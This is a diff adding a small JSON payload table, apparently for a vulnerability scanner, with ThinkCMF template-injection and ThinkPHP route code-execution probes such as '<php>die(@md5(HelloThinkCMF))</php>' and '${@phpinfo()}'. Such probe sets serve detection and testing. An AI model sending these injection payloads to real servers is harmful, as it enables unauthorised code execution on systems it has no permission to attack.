@@ -1,0 +1,30 @@
+{
+ "parameters": [
+  {
+   "name": "content",
+   "uuid": "4ee0c28d-d308-413c-a0cc-167793b03bf4"
+  },
+  {
+   "name": "s",
+   "uuid": "67dfa4e5-2e27-4aa5-84d8-7a581291a749"
+  }
+ ],
+ "rows": [
+  {
+   "content": "<php>die(@md5(HelloThinkCMF))</php>",
+   "s": "captcha"
+  },
+  {
+   "content": "<php>die(@md5(HelloThinkCMF))</php>",
+   "s": "index/\\think\\module/action/param1/${@phpinfo()}"
+  },
+  {
+   "content": "<php>die(@md5(HelloThinkCMF))</php>",
+   "s": "index/\\think\\Module/Action/Param/${@phpinfo()}"
+  },
+  {
+   "content": "<php>die(@md5(HelloThinkCMF))</php>",
+   "s": "index/\\think/module/aciton/param1/${@print(THINK_VERSION)}"
+  }
+ ]
+}
